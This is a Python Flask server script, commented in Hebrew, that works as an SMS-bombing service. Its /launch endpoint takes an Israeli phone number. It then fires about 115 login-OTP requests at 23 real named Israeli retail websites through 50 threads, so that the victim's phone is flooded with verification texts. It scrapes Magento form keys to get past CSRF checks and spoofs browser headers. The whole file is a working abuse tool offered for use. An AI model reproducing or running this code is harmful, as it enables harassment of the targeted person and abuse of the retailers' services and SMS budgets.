from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import re
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)
CORS(app) # מאפשר לאתר ב-Lovable לדבר עם השרת הזה

# --- רשימת 23 האתרים המנצחת ---
SITES = [
    {"name": "Sacara", "url": "https://www.sacara.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Victoria Secret", "url": "https://www.victoriassecret.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf & Co", "url": "https://www.golfco.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Carolina Lemke", "url": "https://www.carolinalemke.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Lee Cooper", "url": "https://www.leecooper.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Vardinon", "url": "https://www.vardinon.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Tevanaot", "url": "https://www.tevanaot.co.il/apps/api/otp/request", "type": "json_api", "key": "phoneNumber"},
    {"name": "Step In", "url": "https://www.stepin.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Crazy Line", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
    {"name": "Papaya", "url": "https://www.papaya.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Tog Shoes", "url": "https://www.tog.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf Kids", "url": "https://www.golfkids.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Lee Israel", "url": "https://www.lee.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Steimatzky", "url": "https://www.steimatzky.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Naaman Outlet", "url": "https://www.naamanp.co.il/customer/ajax/post/", "type": "magento"}
]

def fire_single_shot(site, phone):
    domain = "/".join(site['url'].split("/")[:3])
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": domain + "/",
        "Origin": domain
    }
    session = requests.Session()
    try:
        f_key = "dummy"
        if site['type'] == "magento":
            res_init = session.get(domain, headers=headers, timeout=5)
            match = re.search(r'name="form_key" type="hidden" value="([a-zA-Z0-9]+)"', res_init.text)
            if not match: match = re.search(r'"formKey":\s*"([a-zA-Z0-9]+)"', res_init.text)
            if match: f_key = match.group(1)
            
            payload = {"form_key": f_key, "bot_validation": "1", "type": "login", "telephone": phone}
            res = session.post(site['url'], data=payload, headers=headers, timeout=7)
        else:
            res = session.post(site['url'], json={site['key']: phone}, headers=headers, timeout=7)
        return res.status_code
    except:
        return 500

def run_tsunami_logic(phone):
    """הפונקציה שמנהלת את הירייה האמיתית ברקע"""
    task_list = []
    for s in SITES:
        for _ in range(5): # 5 הודעות מכל אתר
            task_list.append(s)
    
    random.shuffle(task_list)
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(lambda s: fire_single_shot(s, phone), task_list)

@app.route('/launch', methods=['POST'])
def launch():
    """הנקודה אליה האתר ב-Lovable ישלח את הבקשה"""
    data = request.json
    phone = data.get('phone')
    
    if not phone or not re.match(r"05[0-9]{8}", phone):
        return jsonify({"status": "error", "message": "Invalid phone number"}), 400

    # הפעלה ב-Thread נפרד כדי שהאתר יקבל תשובה מיידית שהתחלנו
    threading.Thread(target=run_tsunami_logic, args=(phone,)).start()
    
    return jsonify({"status": "success", "message": f"Tsunami launched on {phone}!"}), 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)